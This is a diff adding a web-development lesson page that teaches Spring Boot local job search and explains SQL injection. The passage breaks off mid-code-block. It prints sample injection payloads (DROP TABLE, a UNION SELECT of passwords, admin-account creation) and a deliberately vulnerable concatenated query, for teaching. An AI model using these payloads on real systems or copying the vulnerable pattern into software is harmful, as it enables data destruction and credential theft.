@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lesson 29: Search Features &amp; Security Basics — Coders Farm</title>
+  <meta name="description" content="Build local search capabilities and learn web application security fundamentals">
+  <meta name="theme-color" content="#1e1e1e">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <link rel="manifest" href="/manifest.json">
+  <link rel="icon" href="/assets/favicon.ico">
+  <link rel="apple-touch-icon" href="/assets/icons/icon-192.png">
+  <link rel="stylesheet" href="/css/base.css">
+  <link rel="stylesheet" href="/css/layout.css">
+  <link rel="stylesheet" href="/css/components.css">
+  <link rel="stylesheet" href="/css/lessons.css">
+</head>
+<body data-page="lesson" data-lesson-id="resumator-29-search-security">
+  <a href="#main" class="skip-link">Skip to main content</a>
+
+  <nav class="top-nav" role="navigation" aria-label="Main navigation">
+    <div class="nav-inner">
+      <div class="nav-left">
+        <a href="/" class="nav-logo" aria-label="Coders Farm home">
+          <img src="../../image2vector.svg" alt="Coders Farm" aria-hidden="true" width="40" height="40">
+          Coders Farm
+        </a>
+        <span class="nav-separator"></span>
+        <span class="nav-title">Search &amp; Security</span>
+      </div>
+      <div class="nav-right">
+        <button class="theme-toggle" aria-label="Toggle dark/light mode">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="hamburger-btn" aria-label="Open menu" aria-expanded="false">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div class="mobile-nav" role="menu">
+      <a href="/" role="menuitem">Home</a>
+      <a href="/lessons/resumator/28-api-tracking-thymeleaf.html" role="menuitem">Lesson 28: API Tracking</a>
+      <a href="/lessons/resumator/29-search-security.html" role="menuitem">Lesson 29: Search &amp; Security</a>
+      <a href="/lessons/resumator/30-review-whats-next.html" role="menuitem">Lesson 30: Review &amp; What's Next</a>
+    </div>
+  </nav>
+
+  <main id="main" class="main-content">
+    <div class="lesson-header">
+      <p class="lesson-breadcrumb"><a href="/">Home</a> / <a href="/">Building Resumator</a> / Search &amp; Security</p>
+      <p class="lesson-progress-indicator" data-track="resumator" data-total="8" data-current="7">Lesson 7 of 8</p>
+      <h1>Search Features &amp; Security Basics</h1>
+      <p style="color: var(--text-muted);">Estimated time: 2.5&ndash;3 hours</p>
+    </div>
+    <div class="lesson-content">
+
+      <!-- ==================== LEARNING OBJECTIVES ==================== -->
+      <div class="learning-objectives">
+        <h3>What You Will Learn</h3>
+        <ul>
+          <li>Build a local database search that queries previously fetched jobs without using API calls</li>
+          <li>Write parameterized JPQL queries with <code>@Query</code> and <code>@Param</code></li>
+          <li>Understand SQL injection &mdash; what it is, how it works, and why parameterized queries prevent it</li>
+          <li>Recognize Cross-Site Scripting (XSS) and how Thymeleaf and <code>.textContent</code> prevent it</li>
+          <li>Add input validation and sanitization to protect your application</li>
+          <li>Implement search filters (state, salary) and sort options</li>
+          <li>Know the OWASP Top 10 and essential security resources</li>
+        </ul>
+      </div>
+
+      <!-- ==================== PART 1 — THE SMART SEARCH PROBLEM ==================== -->
+      <h2>1. The Smart Search Problem</h2>
+
+      <p>Think about how your Resumator application works right now. Every time a user searches for jobs, your application calls the JSearch API. Type "Java Developer" and hit search &mdash; that is one API request. Type it again five minutes later &mdash; another API request. Search for "Software Engineer in Austin" on Monday, then the same search on Tuesday &mdash; two more requests. Every single search, no matter how repetitive, costs you one of your precious 200 monthly API calls.</p>
+
+      <p>But here is the thing: your <code>jobs</code> table already has hundreds of stored results. Every time you called the JSearch API in previous lessons, those results were saved to your database. You have been building up a local collection of real job listings this entire time. Right now, that data is just sitting there, unused, while you burn through API requests to fetch the same kind of results you already have.</p>
+
+      <p>What if you searched your own database first? What if, before spending an API request, your application checked whether it already had relevant results stored locally?</p>
+
+      <p>This is exactly what we are going to build. Two search modes:</p>
+
+      <ol>
+        <li><strong>Local search</strong> &mdash; free, instant, unlimited. Searches the jobs already in your database. Costs zero API requests. Returns results in milliseconds because it is a direct database query with no network latency.</li>
+        <li><strong>API search</strong> &mdash; costs 1 API request. Calls JSearch for fresh results from across the internet. Use this when you want new listings or when local results are not sufficient.</li>
+      </ol>
+
+      <p>The user interface should let the user choose between these modes, with local search as the default. Why local as default? Because it is the smart default. Most of the time, users are browsing, filtering, and re-checking jobs they have already seen. They do not need fresh API data for that. And when they do want fresh results, they can explicitly switch to API search.</p>
+
+      <p>Think about the math. You have 200 API requests per month. If you search twice a day, that is roughly 60 searches per month just for your daily use. But if your local database already has 500 job listings from previous searches, many of those daily searches could be answered locally. You might only need 20 API calls per month for genuinely new searches, saving 40 requests. Those saved requests add up, and they make the difference between hitting your quota mid-month and having plenty of headroom.</p>
+
+      <div class="callout callout-tip">
+        <strong>Tip:</strong> This pattern &mdash; searching local data first, then falling back to an external service &mdash; is extremely common in professional applications. It reduces costs, improves performance, and makes your application work even when the external API is down or slow. You will see this pattern called "cache-first" or "local-first" in industry documentation.
+      </div>
+
+      <p>Let us build the local search first, then connect it to the UI. But along the way, we are going to encounter something critical &mdash; something that every developer must understand before they ever let a user type into a search box. We are going to talk about security.</p>
+
+      <!-- ==================== PART 2 — BUILDING THE LOCAL SEARCH ==================== -->
+      <h2>2. Building the Local Search</h2>
+
+      <p>To search your local database, you need a way to query the <code>jobs</code> table by keyword. The user might type a job title like "Developer", a company name like "Google", or a city like "Austin". Your query needs to check all of these fields and return any job that matches.</p>
+
+      <p>In Spring Data JPA, you can write custom queries using <strong>JPQL</strong> (Java Persistence Query Language). JPQL looks similar to SQL, but instead of querying tables and columns directly, it queries your Java entities and their fields. You write the query using the <code>@Query</code> annotation on a repository method.</p>
+
+      <p>Add this method to your <code>JobRepository</code>:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@Query("SELECT j FROM Job j WHERE " +
+       "LOWER(j.jobTitle) LIKE LOWER(CONCAT('%', :keyword, '%')) OR " +
+       "LOWER(j.employerName) LIKE LOWER(CONCAT('%', :keyword, '%')) OR " +
+       "LOWER(j.jobCity) LIKE LOWER(CONCAT('%', :keyword, '%'))")
+List&lt;Job&gt; searchByKeyword(@Param("keyword") String keyword);</code></pre>
+      </div>
+
+      <p>There is a lot going on in that query, so let us break it down piece by piece:</p>
+
+      <ul>
+        <li><strong><code>SELECT j FROM Job j</code></strong> &mdash; This selects all fields from the <code>Job</code> entity. The <code>j</code> is an alias, just like in SQL. Notice we write <code>Job</code> (the Java class name), not <code>jobs</code> (the table name). That is the JPQL difference.</li>
+        <li><strong><code>LOWER(j.jobTitle)</code></strong> &mdash; The <code>LOWER()</code> function converts the value to lowercase. We apply it to both the database field and the search term so that searching for "developer", "Developer", or "DEVELOPER" all return the same results. This is case-insensitive matching.</li>
+        <li><strong><code>LIKE LOWER(CONCAT('%', :keyword, '%'))</code></strong> &mdash; The <code>LIKE</code> operator with <code>%</code> wildcards on both sides means "contains this text anywhere in the string." <code>CONCAT</code> builds the pattern by wrapping the keyword with <code>%</code> on each side.</li>
+        <li><strong><code>:keyword</code></strong> &mdash; This is a <strong>named parameter</strong>. It is a placeholder that Spring will fill in with the actual value passed to the method. The colon prefix tells JPA "this is a parameter, not a column name."</li>
+        <li><strong><code>@Param("keyword")</code></strong> &mdash; This annotation on the method parameter tells Spring which named parameter in the query it corresponds to. The name in <code>@Param</code> must exactly match the name after the colon in the query.</li>
+        <li><strong><code>OR</code></strong> &mdash; We check three fields: <code>jobTitle</code>, <code>employerName</code>, and <code>jobCity</code>. If the keyword matches any of them, the job is included in the results.</li>
+      </ul>
+
+      <p>Now add the controller endpoint that calls this repository method. In your <code>JobController</code> (or create a dedicated <code>SearchController</code>):</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@GetMapping("/local")
+public List&lt;Job&gt; searchLocal(@RequestParam String keyword) {
+    return jobRepository.searchByKeyword(keyword);
+}</code></pre>
+      </div>
+
+      <p>That is it. Two pieces &mdash; a repository method with a custom query and a controller endpoint that calls it. When a user hits <code>/api/jobs/local?keyword=developer</code>, here is the complete flow:</p>
+
+      <ol>
+        <li>The browser sends a GET request to <code>/api/jobs/local?keyword=developer</code></li>
+        <li>Spring's <code>@RequestParam</code> extracts the <code>keyword</code> parameter from the URL &mdash; the value is <code>"developer"</code></li>
+        <li>The controller calls <code>jobRepository.searchByKeyword("developer")</code></li>
+        <li>Spring Data JPA takes the JPQL query, translates it to SQL, and substitutes <code>:keyword</code> with <code>"developer"</code> as a parameter</li>
+        <li>MySQL executes the query and returns all matching rows</li>
+        <li>JPA maps each row back to a <code>Job</code> Java object</li>
+        <li>Spring serializes the list of <code>Job</code> objects to JSON and returns it in the HTTP response</li>
+      </ol>
+
+      <p>The query runs entirely on your local MySQL database. No API call. No network latency. No quota consumed. If you have 847 jobs saved from previous API searches, this endpoint searches through all 847 of them instantly.</p>
+
+      <p>Try it yourself. Start your Spring Boot application, open your browser, and navigate to <code>http://localhost:8080/api/jobs/local?keyword=developer</code>. You should see a JSON array of jobs whose titles, company names, or cities contain the word "developer." Try different keywords &mdash; a company name, a city, a technology. Each search is free and instant.</p>
+
+      <p>You might also want to add a count endpoint so the frontend can show users how many jobs are in their local database. This is simple:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@GetMapping("/count")
+public long getJobCount() {
+    return jobRepository.count();  // Built-in Spring Data method
+}</code></pre>
+      </div>
+
+      <p>The <code>count()</code> method is provided automatically by <code>JpaRepository</code> &mdash; you do not need to write it. It returns the total number of rows in the <code>jobs</code> table. This powers the "Searching 847 saved jobs" display in the UI, which makes the local database feel like a valuable asset that grows every time the user does an API search.</p>
+
+      <div class="callout callout-info">
+        <strong>JPQL vs SQL:</strong> JPQL uses your Java entity names and field names (<code>Job</code>, <code>jobTitle</code>, <code>employerName</code>), while SQL uses your database table and column names (<code>jobs</code>, <code>job_title</code>, <code>employer_name</code>). JPA translates JPQL to the correct SQL for your database automatically. This means if you ever switched from MySQL to PostgreSQL, your JPQL queries would still work without changes.
+      </div>
+
+      <p>Before we build the frontend for this, we need to stop and talk about something extremely important. You just built a feature where a user types text into a search box, and that text gets inserted into a database query. That sentence should make every experienced developer's alarm bells go off. Here is why.</p>
+
+      <!-- ==================== PART 3 — SQL INJECTION ==================== -->
+      <h2>3. STOP. What About SQL Injection?</h2>
+
+      <p>Before we go any further, we need to talk about one of the most dangerous security vulnerabilities in the history of software. This is not theoretical. This is not something that only happens to other people. This vulnerability has been used to breach governments, steal millions of credit card numbers, expose personal data of hundreds of millions of people, and destroy entire databases. It is called <strong>SQL injection</strong>.</p>
+
+      <p>And it happens when developers do exactly what sounds natural: take what a user typed and put it into a database query.</p>
+
+      <p>Imagine you wrote your search query like this instead of using parameterized queries:</p>
+
+      <div class="callout callout-warning">
+        <strong>WARNING: The following code is deliberately dangerous. NEVER write queries this way. This example exists solely to show you what SQL injection looks like.</strong>
+      </div>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>// NEVER DO THIS — vulnerable to SQL injection!
+String sql = "SELECT * FROM jobs WHERE job_title LIKE '%" + userInput + "%'";</code></pre>
+      </div>
+
+      <p>This code takes whatever the user typed (<code>userInput</code>) and glues it directly into the SQL string. If the user types <code>developer</code>, the resulting SQL is:</p>
+
+      <div class="code-editor" data-language="sql" data-editable="false" data-runnable="false">
+        <pre><code>SELECT * FROM jobs WHERE job_title LIKE '%developer%'</code></pre>
+      </div>
+
+      <p>That looks fine. It works. It returns Java developer jobs. No problem, right?</p>
+
+      <p>Now imagine a malicious user. Instead of typing a job title, they type this into the search box:</p>
+
+      <div class="error-display">'; DROP TABLE jobs; --</div>
+
+      <p>Your code dutifully concatenates that string into the SQL query. The resulting SQL becomes:</p>
+
+      <div class="error-display">SELECT * FROM jobs WHERE job_title LIKE '%'; DROP TABLE jobs; --%'</div>
+
+      <p>Read that carefully. The attacker's input closed the original string with <code>'</code>, ended the first statement with <code>;</code>, then added an entirely new SQL command: <code>DROP TABLE jobs;</code>. The <code>--</code> at the end is a SQL comment, which tells the database to ignore the remaining <code>%'</code> that your code appended.</p>
+
+      <p>The database sees two commands:</p>
+
+      <ol>
+        <li><code>SELECT * FROM jobs WHERE job_title LIKE '%'</code> &mdash; a harmless select</li>
+        <li><code>DROP TABLE jobs</code> &mdash; <strong>DELETE THE ENTIRE JOBS TABLE</strong></li>
+      </ol>
+
+      <p>Gone. Every record. Every job listing you ever saved. Destroyed by a single HTTP request. One line typed into a search box.</p>
+
+      <div class="callout callout-warning">
+        <strong>This is not theoretical.</strong> SQL injection has been used in real attacks against real companies. In 2008, Heartland Payment Systems was breached via SQL injection, exposing 134 million credit card numbers. In 2011, Sony PlayStation Network was hacked, leaking data on 77 million accounts. In 2015, TalkTalk lost the personal data of 157,000 customers through a SQL injection attack executed by a 15-year-old. SQL injection has been ranked the <strong>#1 web application vulnerability</strong> for years in the OWASP Top 10.
+      </div>
+
+      <p>And it does not stop at <code>DROP TABLE</code>. An attacker could use SQL injection to:</p>
+
+      <ul>
+        <li><strong>Read every row in every table:</strong> <code>' UNION SELECT username, password FROM users --</code> &mdash; This appends a second query that reads the entire users table and returns it alongside the normal search results. The attacker sees usernames and passwords right in their browser.</li>
+        <li><strong>Modify data:</strong> <code>'; UPDATE users SET role='admin' WHERE username='attacker' --</code> &mdash; This promotes the attacker's account to admin, giving them full access to the system.</li>
+        <li><strong>Create new admin accounts:</strong> <code>'; INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin') --</code></li>
+        <li><strong>Download your entire database:</strong> Using techniques like UNION-based extraction, an attacker can systematically read every table, column, and row in your database across multiple requests.</li>
+        <li><strong>Execute operating system commands:</strong> In some database configurations (particularly older MySQL with FILE privilege or SQL Server with xp_cmdshell), SQL injection can be escalated to run commands directly on the server operating system.</li>
+      </ul>
+
+      <p>There is a famous XKCD comic about this. A school calls a mother and says, "Did you really name your son Robert'); DROP TABLE Students;--?" She responds, "Oh yes. Little Bobby Tables, we call him." The joke is that the school's student registration system was vulnerable to SQL injection, and the student's name destroyed the Students table when it was inserted. It is funny because it is terrifyingly plausible.</p>
+
+      <p>Think about it from the database's perspective. When you concatenate user input into a SQL string, the database receives one long text string. It has no way to know which parts were written by you (the developer) and which parts were typed by the user. It treats the entire string as SQL and executes all of it. The database is doing exactly what it was told to do. The problem is that the developer accidentally gave the attacker the ability to write part of the instructions.</p>
+
+      <div class="key-concept">
+        <h4>SQL Injection</h4>
+        <p>SQL injection is a security vulnerability where an attacker inserts (or "injects") malicious SQL code through user input fields. It happens whenever user-provided text is concatenated directly into a SQL query string. The database cannot tell the difference between the developer's intended SQL and the attacker's injected SQL, so it executes everything.</p>
+      </div>
+
+      <p>Now here is the good news. There is a simple, reliable way to prevent this entirely. You have already been using it.</p>
+
+      <!-- ==================== PART 4 — PARAMETERIZED QUERIES ==================== -->
+      <h2>4. How Parameterized Queries Protect You</h2>
+
+      <p>Look at the query you wrote earlier:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@Query("SELECT j FROM Job j WHERE LOWER(j.jobTitle) LIKE LOWER(CONCAT('%', :keyword, '%'))")
+List&lt;Job&gt; searchByKeyword(@Param("keyword") String keyword);</code></pre>
+      </div>
+
+      <p>See the <code>:keyword</code>? That is a <strong>parameter placeholder</strong>. It is fundamentally different from string concatenation, and understanding why is one of the most important things you will learn as a developer.</p>
+
+      <p>When you use a parameterized query, here is what happens behind the scenes:</p>
+
+      <ol>
+        <li><strong>Step 1:</strong> Spring/JPA sends the <em>query structure</em> to the database: <code>SELECT j FROM Job j WHERE LOWER(j.jobTitle) LIKE LOWER(CONCAT('%', ?, '%'))</code>. The <code>?</code> is a placeholder. The database parses this structure and compiles it into an execution plan.</li>
+        <li><strong>Step 2:</strong> Spring/JPA sends the <em>parameter value</em> separately: <code>"developer"</code>.</li>
+        <li><strong>Step 3:</strong> The database plugs the value into the placeholder. Crucially, it treats the value as <strong>data only</strong>. It does not re-parse the SQL. It does not look for SQL commands inside the value. The value is data, period.</li>
+      </ol>
+
+      <p>This means if a malicious user types <code>'; DROP TABLE jobs; --</code> into your search box, the database receives:</p>
+
+      <ul>
+        <li>Query structure: <code>SELECT ... WHERE LOWER(j.jobTitle) LIKE LOWER(CONCAT('%', ?, '%'))</code></li>
+        <li>Parameter value: <code>"'; DROP TABLE jobs; --"</code></li>
+      </ul>
+
+      <p>The database searches for job titles containing the literal text <code>'; DROP TABLE jobs; --</code>. It finds nothing, because no job title contains that string. It returns zero results. Your data is completely safe. The <code>DROP TABLE</code> is never executed because the database never interprets the parameter as SQL &mdash; it is just a string being compared against column values.</p>
+
+      <div class="key-concept">
+        <h4>The Golden Rule of Database Queries</h4>
+        <p><strong>NEVER</strong> build SQL or JPQL by concatenating user input into the query string. <strong>ALWAYS</strong> use parameterized queries. This applies to every programming language, every database, every framework, everywhere, always. There are no exceptions.</p>
+      </div>
+
+      <p>Here is some excellent news: <strong>you have been writing safe queries this entire time.</strong> Every Spring Data JPA method you have used &mdash; <code>findById()</code>, <code>findByJobId()</code>, <code>save()</code>, <code>deleteById()</code> &mdash; is parameterized automatically. Spring Data generates the SQL behind the scenes, and it always uses parameters. The <code>@Query</code> annotation with <code>:named</code> parameters is also safe. You have been protected from SQL injection since Lesson 24 without even knowing it.</p>
+
+      <p>The <strong>only</strong> way to accidentally introduce SQL injection in a Spring Boot application is to use raw string concatenation with <code>EntityManager.createNativeQuery()</code>. Here is what that dangerous pattern looks like:</p>
+
+      <div class="code-editor" data-language="java" data-editable="false" data-runnable="false">
+        <pre><code>// DANGEROUS — raw string concatenation with native query
+@PersistenceContext
+private EntityManager entityManager;
+
+public List&lt;Job&gt; unsafeSearch(String userInput) {
+    String sql = "SELECT * FROM jobs WHERE job_title LIKE '%" + userInput + "%'";
+    return entityManager.createNativeQuery(sql, Job.class).getResultList();
+}
+
+// SAFE — parameterized native query
+public List&lt;Job&gt; safeSearch(String userInput) {
+    String sql = "SELECT * FROM jobs WHERE job_title LIKE :keyword";
+    return entityManager.createNativeQuery(sql, Job.class)
+        .setParameter("keyword", "%" + userInput + "%")
+        .getResultList();
+}</code></pre>
+      </div>
+
+      <p>The first method is vulnerable. The second method is safe. The difference is whether user input is concatenated into the string (dangerous) or passed as a parameter (safe). If you ever see code that builds a query string by adding user input with <code>+</code>, treat it as a critical security bug that needs to be fixed immediately.</p>
+
+      <div class="callout callout-tip">
+        <strong>Tip:</strong> In a code review or a job interview, if someone asks "how do you prevent SQL injection?", the answer is always "parameterized queries" (also called "prepared statements"). If you can explain why &mdash; that the query structure and data are sent separately so user input is never interpreted as SQL &mdash; you will stand out as someone who actually understands security, not just someone who memorized a rule.
+      </div>
+
+      <!-- ==================== PART 5 — BUILDING THE SEARCH UI ==================== -->
+      <h2>5. Building the Search UI</h2>
+
+      <p>Now that you understand the security foundation, let us build the user interface. We want two search modes with a clean way to switch between them:</p>
+
+      <ul>
+        <li><strong>"Search saved jobs"</strong> &mdash; the default. Queries your local database. Free and instant.</li>
+        <li><strong>"Search for new jobs"</strong> &mdash; calls the JSearch API. Costs one API request. Use when you want fresh listings.</li>
+      </ul>
+
+      <p>Here is the HTML for the search form with toggle tabs. Add this to your search page (or create a new template):</p>
+
+      <div class="code-editor" data-language="html" data-editable="true" data-runnable="false">
+        <pre><code>&lt;div class="search-container"&gt;
+  &lt;div class="search-tabs"&gt;
+    &lt;button class="search-tab active" data-mode="local"&gt;Search Saved Jobs&lt;/button&gt;
+    &lt;button class="search-tab" data-mode="api"&gt;Search for New Jobs&lt;/button&gt;
+  &lt;/div&gt;
+
+  &lt;p class="search-info" id="searchInfo"&gt;Searching &lt;span id="jobCount"&gt;0&lt;/span&gt; saved jobs&lt;/p&gt;
+
+  &lt;!-- Local search form (default) --&gt;
+  &lt;div class="search-form" id="localForm"&gt;
+    &lt;input type="text" id="localKeyword" placeholder="Search by title, company, or city..."
+           maxlength="200" /&gt;
+    &lt;button id="localSearchBtn" class="btn btn-primary"&gt;Search&lt;/button&gt;
+  &lt;/div&gt;
+
+  &lt;!-- API search form (hidden by default) --&gt;
+  &lt;div class="search-form" id="apiForm" style="display: none;"&gt;
+    &lt;input type="text" id="apiTitle" placeholder="Job title (e.g., Java Developer)" /&gt;
+    &lt;input type="text" id="apiCity" placeholder="City (e.g., Austin)" /&gt;
+    &lt;input type="text" id="apiState" placeholder="State (e.g., TX)" /&gt;
+    &lt;button id="apiSearchBtn" class="btn btn-primary"&gt;Search API&lt;/button&gt;
+    &lt;p class="api-notice"&gt;This uses 1 API request from your monthly quota.&lt;/p&gt;
+  &lt;/div&gt;
+
+  &lt;div id="searchResults"&gt;&lt;/div&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+
+      <p>Notice the two forms: <code>localForm</code> is visible by default and has a single keyword input, while <code>apiForm</code> is hidden and has the full title/city/state fields you built in earlier lessons. The <code>searchInfo</code> paragraph shows the user how many jobs are in their local database, making the local collection feel valuable &mdash; "Searching 847 saved jobs" is much more compelling than a blank search box.</p>
+
+      <p>Now the JavaScript that powers the tab switching and search functionality:</p>
+
+      <div class="code-editor" data-language="javascript" data-editable="true" data-runnable="true">
+        <pre><code>// Tab switching
+const tabs = document.querySelectorAll('.search-tab');
+const localForm = document.getElementById('localForm');
+const apiForm = document.getElementById('apiForm');
+const searchInfo = document.getElementById('searchInfo');
+
+tabs.forEach(tab =&gt; {
+  tab.addEventListener('click', () =&gt; {
+    tabs.forEach(t =&gt; t.classList.remove('active'));
+    tab.classList.add('active');
+
+    const mode = tab.dataset.mode;
+    if (mode === 'local') {
+      localForm.style.display = 'flex';
+      apiForm.style.display = 'none';
+      searchInfo.style.display = 'block';
+    } else {
+      localForm.style.display = 'none';
+      apiForm.style.display = 'flex';
+      searchInfo.style.display = 'none';
+    }
+  });
+});
+
+// Load the saved job count on page load
+fetch('/api/jobs/count')
+  .then(res =&gt; res.json())
+  .then(count =&gt; {
+    document.getElementById('jobCount').textContent = count;
+  });
+
+// Local search — queries YOUR database, free and instant
+document.getElementById('localSearchBtn').addEventListener('click', () =&gt; {
+  const keyword = document.getElementById('localKeyword').value.trim();
+  if (!keyword) return;
+
+  fetch(`/api/jobs/local?keyword=${encodeURIComponent(keyword)}`)
+    .then(res =&gt; res.json())
+    .then(jobs =&gt; {
+      displayResults(jobs, 'local');
+    });
+});
+
+// API search — calls JSearch, costs 1 request
+document.getElementById('apiSearchBtn').addEventListener('click', () =&gt; {
+  const title = document.getElementById('apiTitle').value.trim();
+  const city = document.getElementById('apiCity').value.trim();
+  const state = document.getElementById('apiState').value.trim();
+  if (!title) return;
+
+  const params = new URLSearchParams({ title });
+  if (city) params.append('city', city);
+  if (state) params.append('state', state);
+
+  fetch(`/api/jobs/search?${params.toString()}`)
+    .then(res =&gt; res.json())
+    .then(jobs =&gt; {
+      displayResults(jobs, 'api');
+      // Refresh the local count since new jobs were saved
+      fetch('/api/jobs/count')
+        .then(res =&gt; res.json())
+        .then(count =&gt; {
+          document.getElementById('jobCount').textContent = count;
+        });
+    });
+});
+
+// Display results — notice we use .textContent, NOT .innerHTML
+function displayResults(jobs, mode) {
+  const container = document.getElementById('searchResults');
+  container.innerHTML = ''; // Clear previous results (safe — no user data here)
+
+  if (jobs.length === 0) {
+    const msg = document.createElement('p');
+    msg.textContent = mode === 'local'
+      ? 'No saved jobs match your search. Try searching for new jobs via the API.'
+      : 'No results found. Try different search terms.';
+    container.appendChild(msg);
+    return;
+  }
+
+  jobs.forEach(job =&gt; {
+    const card = document.createElement('div');
+    card.className = 'job-card';
+
+    const title = document.createElement('h3');
+    title.textContent = job.jobTitle;  // .textContent — safe from XSS
+
+    const company = document.createElement('p');
+    company.textContent = job.employerName;  // .textContent — safe from XSS
+
+    const location = document.createElement('p');
+    location.textContent = `${job.jobCity || ''}, ${job.jobState || ''}`;
+
+    card.appendChild(title);
+    card.appendChild(company);
+    card.appendChild(location);
+    container.appendChild(card);
+  });
+}</code></pre>
+      </div>
+
+      <p>There are several important things to notice in this JavaScript:</p>
+
+      <ul>
+        <li><strong><code>encodeURIComponent(keyword)</code></strong> &mdash; This encodes the user's input for safe inclusion in a URL. Without this, special characters like <code>&amp;</code> or <code>=</code> in the search term could break the URL structure.</li>
+        <li><strong><code>.textContent</code></strong> &mdash; Every place where we display data from the server, we use <code>.textContent</code> instead of <code>.innerHTML</code>. We will explain why in detail in Part 7, but the short version is: <code>.textContent</code> is safe, <code>.innerHTML</code> is dangerous. This callback goes all the way back to Lesson 6, where you first learned the difference.</li>
+        <li><strong>Two distinct fetch calls</strong> &mdash; Local search hits <code>/api/jobs/local</code> (your database), API search hits <code>/api/jobs/search</code> (the JSearch API through your backend). The user controls which one to use.</li>
+        <li><strong>Count refresh after API search</strong> &mdash; After an API search saves new jobs, we update the local count so the user sees their local collection growing.</li>
+      </ul>
+
+      <div class="callout callout-info">
+        <strong>Why two search modes instead of one?</strong> You could build an "auto" mode that checks local first and falls back to the API automatically. But making it explicit gives the user control and transparency. They know exactly when they are using an API request and when they are not. Transparency builds trust, and it teaches users to think about resource usage &mdash; a habit that translates directly to professional development work.
+      </div>
+
+      <p>Test the complete search flow. Start your application, navigate to the search page, and try searching with the "Search Saved Jobs" tab active. Type a keyword and click search. You should see results appear instantly from your local database. Then switch to the "Search for New Jobs" tab, enter a job title and city, and click "Search API." New results should appear, and the saved job count should increase as those new results are stored in your database. Every API search makes your local database more valuable.</p>
+
+      <div class="callout callout-tip">
+        <strong>Tip:</strong> You can enhance the search experience further by adding keyboard support. Listen for the <code>keypress</code> event on the search input and trigger the search when the user presses Enter. This is a small usability improvement that users expect from any search interface:
+      </div>
+
+      <div class="code-editor" data-language="javascript" data-editable="true" data-runnable="false">
+        <pre><code>document.getElementById('localKeyword').addEventListener('keypress', (e) =&gt; {
+  if (e.key === 'Enter') {
+    document.getElementById('localSearchBtn').click();
+  }
+});</code></pre>
+      </div>
+
+      <!-- ==================== PART 6 — SEARCH FILTERS AND SORTING ==================== -->
+      <h2>6. Search Filters and Sorting</h2>
+
+      <p>A keyword search is a great start, but users often want to narrow their results further. "Show me only jobs in Texas." "Show me only jobs that pay at least $80,000." "Show me the newest jobs first." These are filters and sort options, and they are straightforward to add with Spring Data JPA.</p>
+
+      <p>Add these methods to your <code>JobRepository</code>:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>// Filter by state
+List&lt;Job&gt; findByJobStateIgnoreCase(String state);
+
+// Filter by salary — find jobs where either min or max salary meets the threshold
+@Query("SELECT j FROM Job j WHERE j.jobMinSalary &gt;= :min OR j.jobMaxSalary &gt;= :min")
+List&lt;Job&gt; findBySalaryAtLeast(@Param("min") Double min);
+
+// Sort options
+List&lt;Job&gt; findAllByOrderByFirstSeenAtDesc();  // Newest first
+List&lt;Job&gt; findAllByOrderByEmployerNameAsc();   // Alphabetical by company</code></pre>
+      </div>
+
+      <p>Let us walk through each of these:</p>
+
+      <ul>
+        <li><strong><code>findByJobStateIgnoreCase(String state)</code></strong> &mdash; Spring Data JPA generates the query from the method name. <code>findBy</code> starts a query, <code>JobState</code> identifies the field, and <code>IgnoreCase</code> makes the comparison case-insensitive. So <code>findByJobStateIgnoreCase("TX")</code> and <code>findByJobStateIgnoreCase("tx")</code> return the same results. This is all <strong>parameterized automatically</strong> &mdash; the state value is always treated as data, never as SQL.</li>
+        <li><strong><code>findBySalaryAtLeast</code></strong> &mdash; This uses <code>@Query</code> because the logic (checking either <code>jobMinSalary</code> or <code>jobMaxSalary</code>) is more complex than what Spring Data can generate from a method name alone. The <code>:min</code> parameter is safe &mdash; <strong>parameterized</strong>.</li>
+        <li><strong><code>findAllByOrderByFirstSeenAtDesc()</code></strong> &mdash; Returns all jobs sorted by when they were first seen, newest first. The <code>Desc</code> suffix means descending order. No user input at all here, so no injection risk.</li>
+        <li><strong><code>findAllByOrderByEmployerNameAsc()</code></strong> &mdash; Returns all jobs sorted alphabetically by company name. <code>Asc</code> means ascending (A to Z).</li>
+      </ul>
+
+      <p>Notice the pattern: every single one of these methods is parameterized and safe. Every method that accepts user input (<code>state</code>, <code>min</code>) passes it as a parameter, not as concatenated text. You are building secure queries by default.</p>
+
+      <p>You can also combine filters. If you want to search by keyword within a specific state, add a more specific repository method:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@Query("SELECT j FROM Job j WHERE " +
